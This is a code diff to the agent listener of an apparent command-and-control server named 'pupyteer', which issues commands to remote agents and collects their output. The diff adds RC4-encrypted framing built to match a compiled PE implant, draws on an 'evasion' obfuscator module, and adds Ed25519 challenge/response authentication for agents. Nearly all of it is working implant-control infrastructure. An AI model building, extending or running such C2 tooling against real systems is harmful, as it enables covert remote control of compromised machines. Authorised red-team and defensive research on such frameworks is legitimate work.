@@ -6,19 +6,35 @@ command on check-in, and collects command output.
 
 Protocol: newline-delimited JSON messages over a plain TCP socket.
 
+Transport encryption is OPTIONAL. When the listener is constructed with a
+``rc4_key`` (hex string) in its config, every inbound frame is RC4-decrypted
+and every outbound frame is RC4-encrypted, matching the compiled PE agent
+(``pe_template.c``) which RC4-frames both directions with ``AGENT_RC4KEY``.
+With no ``rc4_key`` the wire stays plaintext (default) — the path the Python
+agent stub and the test-suite exercise. The C agent is the source of truth
+for the framing; see the WIRE FORMAT comment atop ``pe_template.c``.
+
 Message types:
     Agent → Server:
         {"type": "register", "hostname": "...", "os": "...", "arch": "...",
-         "username": "...", "agent_version": "..."}
+         "username": "...", "agent_version": "...", "agent_id": "...",
+         "signature": "<hex ed25519 sig over nonce>"}
         {"type": "checkin", "session_id": "..."}
         {"type": "output", "session_id": "...", "command_id": "...",
          "output": "..."}
 
     Server → Agent:
+        {"type": "challenge", "nonce": "<hex>"}
         {"type": "registered", "session_id": "..."}
         {"type": "commands", "commands": [{"command_id": "...", "command": "..."}]}
         {"type": "ack"}
         {"type": "error", "message": "..."}
+
+Registration is authenticated with a per-agent Ed25519 keypair (see
+``pupyteer.server.core.agent_keys``). On ``register`` the listener issues a
+nonce via ``challenge``; the agent signs it and the server verifies against
+the pubkey registry before creating a session. Unknown or unsigned agents are
+dropped — closing the unauthenticated-session hole.
 """
 from __future__ import annotations
 
@@ -50,7 +66,8 @@ class PendingCommand:
 class ConnectionState:
     """Mutable state for one connected agent."""
 
-    __slots__ = ("session_id", "writer", "addr", "connected_at", "last_activity")
+    __slots__ = ("session_id", "writer", "addr", "connected_at", "last_activity",
+                 "agent_id", "authenticated")
 
     def __init__(
         self,
@@ -63,6 +80,9 @@ class ConnectionState:
         self.addr = addr
         self.connected_at = time.time()
         self.last_activity = time.time()
+        # Populated after a successful authenticated registration.
+        self.agent_id: Optional[str] = None
+        self.authenticated: bool = False
 
 
 class AgentListener:
@@ -83,11 +103,45 @@ class AgentListener:
         config: Dict[str, Any],
         session_manager: Any,
         audit_logger: AuditLogger,
+        agent_keys: Any = None,
     ):
         self._host: str = config.get("host", "0.0.0.0")
         self._port: int = int(config.get("port", 8443))
         self._session_manager = session_manager
         self._audit = audit_logger
+        # AgentKeyRegistry for Ed25519 registration verification. If None,
+        # registration falls back to UNSIGNED (legacy) — see _handle_register.
+        self._agent_keys = agent_keys
+        # When True, reject agents whose registration lacks a valid signature.
+        # Driven by security.require_agent_auth (defaults on when a registry
+        # is present).
+        self._require_agent_auth: bool = bool(
+            config.get("require_agent_auth", agent_keys is not None)
+        )
+        # Optional RC4 transport key (hex string). When set, the listener
+        # decrypts inbound messages and encrypts outbound ones with RC4 so it
+        # interoperates with the compiled PE agent (pe_template.c), which
+        # RC4-frames every message in BOTH directions using AGENT_RC4KEY.
+        # When None (default) the wire stays plaintext — this is the path the
+        # Python agent stub and the test-suite exercise. The C agent is the
+        # source of truth for the framing; see the WIRE FORMAT comment at the
+        # top of pupyteer/agent/core/pe_template.c.
+        self._rc4_key: Optional[bytes] = None
+        rc4_key_cfg = config.get("rc4_key")
+        if rc4_key_cfg:
+            try:
+                self._rc4_key = bytes.fromhex(str(rc4_key_cfg))
+            except ValueError:
+                logger.warning(
+                    "Listener rc4_key is not valid hex; ignoring — "
+                    "wire transport will remain plaintext."
+                )
+            # Per-connection RC4 stream buffer. RC4 output length == plaintext
+            # length, so a ciphertext byte may equal '\n' and split a frame across
+            # reader.readline() calls. We accumulate raw ciphertext here and
+            # decrypt continuously in _rc4_extract(), keyed by connection in the
+            # handler (reset on each new connection).
+            self._rc4_buf = bytearray()
 
         self._server: Optional[asyncio.base_events.Server] = None
         self._connections: Dict[str, ConnectionState] = {}  # session_id → state
@@ -164,9 +218,44 @@ class AgentListener:
 
         logger.debug("New agent connection from %s", remote_str)
         self._stats["connections"] += 1
+        # Fresh RC4 stream state for this connection.
+        self._rc4_buf = bytearray()
 
         try:
             while True:
+                if self._rc4_key is not None:
+                    # RC4 mode does NOT use newline framing: RC4 output length
+                    # equals plaintext length, so any ciphertext byte can equal
+                    # '\n' or '\r'. reader.readline() would split frames on
+                    # spurious delimiters and corrupt the ciphertext stream.
+                    # Instead read raw chunks, accumulate ciphertext, and
+                    # decrypt the whole buffer as one continuous RC4 stream,
+                    # pulling out balanced JSON objects as they complete.
+                    chunk = await reader.read(4096)
+                    if not chunk:
+                        # EOF — flush anything decodable then stop.
+                        msgs, leftover = self._rc4_extract(self._rc4_buf)
+                        for msg in msgs:
+                            r = await self._dispatch(msg, remote_str, writer)
+                            if r == "":
+                                break
+                        break
+                    self._stats["bytes_received"] += len(chunk)
+                    self._rc4_buf.extend(chunk)
+                    msgs, leftover = self._rc4_extract(self._rc4_buf)
+                    self._rc4_buf = bytearray(leftover)
+                    drop = False
+                    for msg in msgs:
+                        result = await self._dispatch(msg, remote_str, writer)
+                        if result:
+                            session_id = result
+                        if result == "":
+                            drop = True
+                            break
+                    if drop:
+                        break
+                    continue
+
                 try:
                     line = await reader.readline()
                 except (ConnectionError, OSError):
@@ -178,12 +267,11 @@ class AgentListener:
 
                 self._stats["bytes_received"] += len(line)
 
-                # Strip whitespace / newline
-                line_str = line.decode("utf-8", errors="replace").strip()
+                # Plaintext path: strip whitespace / newline
+                raw = line.rstrip(b"\r\n")
+                line_str = raw.decode("utf-8", errors="replace").strip()
                 if not line_str:
                     continue
-
-                # Parse JSON
                 try:
                     msg: Dict[str, Any] = json.loads(line_str)
                 except json.JSONDecodeError as exc:
@@ -195,34 +283,11 @@ class AgentListener:
                         {"type": "error", "message": "invalid_json"},
                     )
                     continue
-
-                # Dispatch
-                try:
-                    response = await self._process_message(
-                        msg, remote_str, writer
-                    )
-                    # Capture session_id from registration for cleanup
-                    if (
-                        msg.get("type") == "register"
-                        and response
-                        and response.get("type") == "registered"
-                    ):
-                        session_id = response["session_id"]
-                except Exception as exc:
-                    logger.exception(
-                        "Error processing %s from %s: %s",
-                        msg.get("type"), remote_str, exc,
-                    )
-                    await self._send_json(
-                        writer,
-                        {"type": "error", "message": "internal_error"},
-                    )
-                    continue
-
-                if response is not None:
-                    sent = await self._send_json(writer, response)
-                    if sent == -1:
-                        break  # write failed, drop connection
+                result = await self._dispatch(msg, remote_str, writer)
+                if result:
+                    session_id = result
+                elif result == "":
+                    break  # write failed, drop connection
 
         except asyncio.CancelledError:
             pass
@@ -244,6 +309,131 @@ class AgentListener:
     # ------------------------------------------------------------------
     #  Message dispatch
     # ------------------------------------------------------------------
+
+    async def _dispatch(
+        self,
+        msg: Dict[str, Any],
+        remote: str,
+        writer: asyncio.StreamWriter,
+    ) -> Optional[str]:
+        """Process one parsed message, send its reply, return any session_id.
+
+        Shared by both the plaintext and RC4 paths. Returns the session_id
+        captured from a successful registration (for connection cleanup), or
+        None. Never raises — send/dispatch failures are logged and surfaced to
+        the peer as an error frame.
+        """
+        captured_session: Optional[str] = None
+        try:
+            response = await self._process_message(msg, remote, writer)
+            if (
+                msg.get("type") == "register"
+                and response
+                and response.get("type") == "registered"
+            ):
+                captured_session = response["session_id"]
+        except Exception as exc:
+            logger.exception(
+                "Error processing %s from %s: %s",
+                msg.get("type"), remote, exc,
+            )
+            await self._send_json(
+                writer,
+                {"type": "error", "message": "internal_error"},
+            )
+            return captured_session
+
+        if response is not None:
+            sent = await self._send_json(writer, response)
+            if sent == -1:
+                # Signal caller to drop the connection on write failure.
+                return captured_session or ""
+        return captured_session
+
+    def _rc4_extract(self, buf: bytearray):
+        """Decrypt accumulated RC4 ciphertext into complete JSON messages.
+
+        The compiled PE agent frames each message as
+        ``RC4(json + '\\n') + '\\n'`` — i.e. the plaintext's own '\\n' is inside
+        the ciphertext, and an additional '\\n' is appended on the wire. Because
+        RC4 output length equals plaintext length, ANY ciphertext byte can equal
+        '\\n', so we cannot rely on the wire '\\n' as a frame boundary. Instead we
+        RC4-decrypt the whole buffer as a continuous stream and pull out every
+        balanced JSON object we can, returning (messages, leftover_bytes).
+
+        Returns (list_of_dicts, leftover_bytearray). Leftover is the tail that
+        has not yet formed a complete, balanced JSON object.
+        """
+        from pupyteer.server.evasion.obfuscator import rc4_crypt
+
+        msgs = []
+        # Strip trailing framing newlines the agent appends AFTER the ciphertext
+        # (pe_template.c sends RC4(json+'\n') then a separate '\n'). These are
+        # NOT part of the ciphertext stream. RC4 preserves length, so removing
+        # them keeps the ciphertext prefix intact for a clean decrypt.
+        ct = bytes(buf).rstrip(b"\n").rstrip(b"\r")
+        if not ct:
+            return msgs, bytearray()
+        try:
+            plain = rc4_crypt(ct, self._rc4_key)
+        except Exception as exc:
+            logger.warning("RC4 stream decrypt failed: %s", exc)
+            # Drop the buffer to avoid a poison-pill loop; report once.
+            return msgs, bytearray()
+
+        text = plain.decode("utf-8", errors="ignore")
+        # Walk the plaintext, extracting balanced top-level JSON objects.
+        depth = 0
+        start = -1
+        in_str = False
+        esc = False
+        consumed = 0
+        for i, ch in enumerate(text):
+            if in_str:
+                if esc:
+                    esc = False
+                elif ch == "\\":
+                    esc = True
+                elif ch == '"':
+                    in_str = False
+                continue
+            if ch == '"':
+                in_str = True
+            elif ch == "{":
+                if depth == 0:
+                    start = i
+                depth += 1
+            elif ch == "}":
+                if depth > 0:
+                    depth -= 1
+                    if depth == 0 and start >= 0:
+                        candidate = text[start:i + 1]
+                        try:
+                            msgs.append(json.loads(candidate))
+                            consumed = i + 1
+                        except json.JSONDecodeError:
+                            pass
+                        start = -1
+        # Leftover: ciphertext tail whose plaintext hasn't yet formed a complete
+        # JSON object. consumed is a CHARACTER index into the decoded text; map
+        # it back to a ciphertext BYTE offset by re-encoding the consumed prefix
+        # (errors="ignore" keeps lengths consistent for the retained tail).
+        # After the closing '}', also consume the frame's trailing newline (the
+        # agent's plaintext JSON ends in '\n' inside the RC4). Each beacon frame
+        # is an INDEPENDENT RC4 stream (pe_template.c calls rc4_crypt per
+        # message), so trailing framing must be dropped, never carried into the
+        # next frame's ciphertext — doing so desyncs the keystream.
+        if consumed <= 0:
+            # Nothing parsed yet — keep everything as leftover.
+            return msgs, bytearray(ct)
+        # Extend consumed past any trailing whitespace/newline in the plaintext.
+        tail = text[consumed:]
+        stripped = tail.lstrip()
+        consumed += len(tail) - len(stripped)
+        consumed_bytes = len(text[:consumed].encode("utf-8", errors="ignore"))
+        if consumed_bytes >= len(ct):
+            return msgs, bytearray()
+        return msgs, bytearray(ct[consumed_bytes:])
 
     async def _process_message(
         self,
@@ -274,7 +464,84 @@ class AgentListener:
         remote: str,
         writer: asyncio.StreamWriter,
     ) -> Dict[str, Any]:
-        """Create a new session and register it."""
+        """Register an agent — authenticated via Ed25519 challenge/response.
+
+        Flow when an agent-key registry is configured (the default):
+          1. Agent sends {"type":"register", "agent_id": "...", ...} WITHOUT a
+             signature. We issue a per-connection nonce and reply
+             {"type":"challenge","nonce":...}.
+          2. Agent re-sends the same register with "nonce" and "signature".
+          3. We verify the signature against the pubkey on file for agent_id.
+          Only then is a session created.
+
+        Legacy fallback: if no registry is present AND require_agent_auth is
+        False, an unsigned register is accepted (old behaviour) so existing
+        lab tooling keeps working. Logged loudly so it's never silent.
+        """
+        agent_id = msg.get("agent_id", "")
+        signature = msg.get("signature", "")
+        nonce = msg.get("nonce", "")
+
+        # ---- Stage 1: no signature yet -> issue a challenge ----
+        if not signature:
+            if self._agent_keys is not None:
+                if not agent_id:
+                    return {"type": "error", "message": "missing_agent_id"}
+                nonce_out = self._agent_keys.issue_nonce(agent_id)
+                self._audit.log_event(
+                    "agent_challenge_issued",
+                    {"agent_id": agent_id, "remote": remote},
+                )
+                return {"type": "challenge", "nonce": nonce_out}
+            # No registry configured and auth not required -> legacy accept.
+            if self._require_agent_auth:
+                return {"type": "error", "message": "auth_required"}
+            logger.warning(
+                "UNSIGNED agent registration accepted (no key registry): %s from %s",
+                agent_id or "<none>", remote,
+            )
+            return await self._create_session(msg, remote, writer, agent_id or None)
+
+        # ---- Stage 2: signed register -> verify ----
+        if self._agent_keys is None:
+            return {"type": "error", "message": "auth_unavailable"}
+        if not agent_id:
+            return {"type": "error", "message": "missing_agent_id"}
+        if not self._agent_keys.is_known(agent_id):
+            self._audit.log_event(
+                "agent_auth_rejected",
+                {"agent_id": agent_id, "remote": remote, "reason": "unknown_agent"},
+                result="denied",
+            )
+            logger.warning(
+                "Rejected registration for unknown agent %s from %s",
+                agent_id, remote,
+            )
+            return {"type": "error", "message": "unknown_agent"}
+
+        ok = self._agent_keys.verify_registration(agent_id, signature, nonce)
+        if not ok:
+            self._audit.log_event(
+                "agent_auth_rejected",
+                {"agent_id": agent_id, "remote": remote, "reason": "bad_signature"},
+                result="denied",
+            )
+            logger.warning(
+                "Rejected registration: bad signature for agent %s from %s",
+                agent_id, remote,
+            )
+            return {"type": "error", "message": "bad_signature"}
+
+        return await self._create_session(msg, remote, writer, agent_id)
+
+    async def _create_session(
+        self,
+        msg: Dict[str, Any],
+        remote: str,
+        writer: asyncio.StreamWriter,
+        agent_id: Optional[str],
+    ) -> Dict[str, Any]:
+        """Create + register a SessionInfo for an authenticated agent."""
         session_id = str(uuid.uuid4())[:12]
 
         info = SessionInfo(
@@ -290,11 +557,14 @@ class AgentListener:
         registered_id = await self._session_manager.register(info)
 
         async with self._lock:
-            self._connections[registered_id] = ConnectionState(
+            conn = ConnectionState(
                 session_id=registered_id,
                 writer=writer,
                 addr=remote,
             )
+            conn.agent_id = agent_id
+            conn.authenticated = True
+            self._connections[registered_id] = conn
 
         self._stats["sessions_created"] += 1
 
@@ -302,6 +572,7 @@ class AgentListener:
             "session_registered",
             {
                 "session_id": registered_id,
+                "agent_id": agent_id,
                 "hostname": info.hostname,
                 "os": info.os,
                 "arch": info.arch,
@@ -311,8 +582,8 @@ class AgentListener:
             session=registered_id,
         )
         logger.info(
-            "Agent registered: %s (%s@%s) from %s",
-            registered_id, info.username, info.hostname, remote,
+            "Agent registered: %s (agent_id=%s, %s@%s) from %s",
+            registered_id, agent_id, info.username, info.hostname, remote,
         )
 
         return {"type": "registered", "session_id": registered_id}
@@ -328,6 +599,18 @@ class AgentListener:
     ) -> Dict[str, Any]:
         """Return queued commands for the session and bump last_checkin."""
         session_id = msg.get("session_id", "")
+
+        # Reject check-ins on sessions that never authenticated (only possible
+        # when running in legacy unsigned mode — still guarded defensively).
+        async with self._lock:
+            conn = self._connections.get(session_id)
+        if conn is not None and not conn.authenticated:
+            self._audit.log_event(
+                "agent_auth_rejected",
+                {"session_id": session_id, "reason": "unauthenticated_checkin"},
+                result="denied",
+            )
+            return {"type": "error", "message": "unauthenticated"}
 
         # Update heartbeat
         await self._session_manager.update_checkin(session_id)
@@ -405,6 +688,13 @@ class AgentListener:
         """
         try:
             data = (json.dumps(payload) + "\n").encode("utf-8")
+            if self._rc4_key is not None:
+                # PE agent decrypts inbound frames with the same RC4 key. It
+                # strips the trailing framing '\n' then RC4-decrypts the
+                # remainder, so we encrypt the JSON (with its own '\n' inside
+                # the RC4) and append a fresh delimiter '\n' on the wire.
+                from pupyteer.server.evasion.obfuscator import rc4_crypt
+                data = rc4_crypt(data, self._rc4_key) + b"\n"
             writer.write(data)
             await writer.drain()
             self._stats["bytes_sent"] += len(data)
